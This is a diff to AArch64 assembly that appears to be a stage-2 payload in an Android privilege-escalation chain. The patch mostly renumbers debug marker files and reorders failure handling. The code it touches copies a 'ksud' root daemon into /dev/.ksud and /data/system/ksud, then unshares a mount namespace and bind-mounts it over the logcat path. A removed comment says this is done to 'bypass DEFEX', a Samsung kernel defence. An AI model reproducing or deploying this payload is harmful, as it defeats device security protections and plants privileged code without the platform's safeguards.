@@ -24,15 +24,15 @@ logcat_path:
 root_path:
     .asciz "/"
 mark_modprobe:
-    .asciz "/dev/dfm1"
+    .asciz "/dev/dfm0"
 mark_bind_ns:
-    .asciz "/dev/dfm2"
-mark_bind_ok:
     .asciz "/dev/dfm3"
-mark_exec_fail:
+mark_bind_ok:
     .asciz "/dev/dfm4"
-mark_ksud_ok:
+mark_exec_fail:
     .asciz "/dev/dfm6"
+mark_ksud_ok:
+    .asciz "/dev/dfm5"
     .global libc_ksud_proc_path_off
 libc_ksud_proc_path_off:
     .int s2_ksud_proc_path - libc_data
@@ -127,8 +127,9 @@ matched:
     mov  x3, xzr
     mov  x8, #SYS_openat
     svc  0
-    tbnz w0, #31, s2_cp_open_fail
+    tbnz w0, #31, s2_cp_done
     str  w0, [sp, 0]
+    create_mark s2_fail_mark
 
     // copy 1: memfd -> /dev/.ksud (bind mount target)
     mov  x0, -100
@@ -194,10 +195,6 @@ s2_cp2_close_dst:
     svc  0
     b    s2_cp_src_close
 
-s2_cp_open_fail:
-    create_mark s2_fail_mark
-    b    s2_cp_done
-
 s2_cp_src_close:
     ldr  w0, [sp, 0]
     mov  x8, #SYS_close
@@ -214,16 +211,17 @@ s2_dst2_path:
     .asciz "/data/system/ksud"
     .balign 4
 s2_pre_mark:
-    .asciz "/dev/dfm0"
+    .asciz "/dev/dfm1"
     .balign 4
 s2_fail_mark:
-    .asciz "/dev/dfmf"
+    .asciz "/dev/dfm2"
     .balign 4
 s2_copy_strs_end:
 
     sub sp, sp, 80
 
-    // Bypass DEFEX by bind mount.
+    create_mark mark_bind_ns
+
     movl x0, (CLONE_NEWNS)
     mov x8, #SYS_unshare
     svc 0
@@ -239,7 +237,7 @@ s2_copy_strs_end:
     svc 0
     cbnz w0, myexit
 
-    create_mark mark_bind_ns
+    create_mark mark_bind_ok
 
     // mount(ksud_path, logcat_path, NULL, MS_BIND, NULL)
     adr x9, ksud_path
@@ -251,8 +249,6 @@ s2_copy_strs_end:
     mov x8, #SYS_mount
     svc 0
     cbnz w0, myexit
-
-    create_mark mark_bind_ok
 
     // x26=1: include --soft-reboot; x26=0: omit it.
     adr     x9, soft_reboot_flag
